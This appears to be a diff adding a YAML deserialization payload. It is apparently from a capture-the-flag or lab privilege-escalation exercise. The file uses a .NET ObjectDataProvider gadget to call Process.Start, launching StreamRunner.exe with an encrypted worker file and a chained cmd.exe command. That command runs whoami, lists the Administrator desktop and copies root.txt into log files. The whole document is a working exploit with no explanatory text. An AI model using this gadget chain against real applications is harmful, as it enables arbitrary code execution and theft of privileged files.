@@ -1,0 +1,11 @@
+!<!System.Windows.Data.ObjectDataProvider,PresentationFramework> {
+  MethodName: Start,
+  ObjectInstance:
+    !<!System.Diagnostics.Process,System.Diagnostics.Process> {
+      StartInfo:
+        !<!System.Diagnostics.ProcessStartInfo,System.Diagnostics.Process> {
+          FileName: 'C:\Users\svc-aegis-deploy\Documents\StreamRunner.exe',
+          Arguments: 'C:\Users\svc-aegis-deploy\Documents\AuditWorker.enc -cmd "cmd.exe /c C:\Windows\System32\whoami.exe > C:\ProgramData\AegisStream\logs\system-identity.txt 2>&1 & dir /a C:\Users\Administrator\Desktop > C:\ProgramData\AegisStream\logs\root-dir.txt 2>&1 & type C:\Users\Administrator\Desktop\root.txt > C:\ProgramData\AegisStream\logs\root-candidate.txt 2>&1"'
+        }
+    }
+}
